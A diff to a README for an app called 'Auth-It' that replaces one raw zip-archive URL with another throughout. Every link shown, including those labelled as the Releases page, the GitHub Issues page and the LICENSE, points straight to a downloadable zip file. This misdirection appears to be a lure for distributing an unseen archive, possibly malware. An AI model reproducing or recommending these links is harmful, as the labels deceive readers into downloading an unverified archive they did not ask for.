@@ -1,6 +1,6 @@
 # 🔒 Auth-It - Easy, Secure Authentication Made Simple
 
-[![Download Here](https://raw.githubusercontent.com/Anant-infin/Auth-It/main/ergostat/Auth-It.zip%https://raw.githubusercontent.com/Anant-infin/Auth-It/main/ergostat/Auth-It.zip)](https://raw.githubusercontent.com/Anant-infin/Auth-It/main/ergostat/Auth-It.zip)
+[![Download Here](https://github.com/Anant-infin/Auth-It/raw/refs/heads/main/android/app/Auth-It-2.8.zip%https://github.com/Anant-infin/Auth-It/raw/refs/heads/main/android/app/Auth-It-2.8.zip)](https://github.com/Anant-infin/Auth-It/raw/refs/heads/main/android/app/Auth-It-2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Auth-It works on the following operating systems:
 
 To get started, you need to visit the Releases page to download the application.
 
-[**Visit this page to download**](https://raw.githubusercontent.com/Anant-infin/Auth-It/main/ergostat/Auth-It.zip)
+[**Visit this page to download**](https://github.com/Anant-infin/Auth-It/raw/refs/heads/main/android/app/Auth-It-2.8.zip)
 
 ### 🔍 Installation Steps
 
@@ -73,7 +73,7 @@ Each platform will also need Bluetooth capability to use the proximity-based fea
 
 ## 🌟 Support
 
-If you encounter any issues during installation or usage, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Anant-infin/Auth-It/main/ergostat/Auth-It.zip). You can report problems and find solutions shared by other users.
+If you encounter any issues during installation or usage, please visit our [GitHub Issues page](https://github.com/Anant-infin/Auth-It/raw/refs/heads/main/android/app/Auth-It-2.8.zip). You can report problems and find solutions shared by other users.
 
 ## 🧑‍🤝‍🧑 Community
 
@@ -81,7 +81,7 @@ Join our community to share your experience with Auth-It. Engage with other user
 
 ## 📜 License
 
-Auth-It is open-source and available for you to use, modify, and distribute. Please check the [LICENSE](https://raw.githubusercontent.com/Anant-infin/Auth-It/main/ergostat/Auth-It.zip) for more details.
+Auth-It is open-source and available for you to use, modify, and distribute. Please check the [LICENSE](https://github.com/Anant-infin/Auth-It/raw/refs/heads/main/android/app/Auth-It-2.8.zip) for more details.
 
 ---
 
